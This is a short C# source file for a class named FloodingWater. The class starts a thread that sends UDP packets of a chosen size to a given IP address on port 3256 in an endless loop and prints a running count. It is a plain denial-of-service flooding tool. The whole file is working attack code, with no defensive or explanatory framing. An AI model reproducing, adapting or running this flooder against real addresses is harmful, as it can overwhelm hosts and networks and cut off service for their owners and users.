using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace FloodingWater
{
    class FloodingWater
    {
        private Thread t;

        public FloodingWater(string ip, int pbytes)
        {
            t = new Thread(() => this.Flood(ip, pbytes, false));
            t.Start();
        }

        /// <summary>
        /// Flood method
        /// </summary>
        /// <param name="ip">IP address to flood</param>
        /// <param name="size">Size of the packet</param>
        public void Flood(string ip, int size, bool upnp)
        {
            int count = 0, port = 3256;
            IPEndPoint ep;

            while (true)
            {
                try
                {
                    byte[] pbytes = new byte[size * 1024];

                    ep = new IPEndPoint(IPAddress.Parse(ip), port);

                    SocketType st = SocketType.Dgram;
                    ProtocolType pt = ProtocolType.Udp;

                    Socket sock = new Socket(AddressFamily.InterNetwork, st, pt);
                    sock.SendTo(pbytes, ep);
                    count++;

                    Console.Clear();
                    Console.WriteLine("Sent {0} packets!", count);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    break;
                }
            }
        }
    }
}
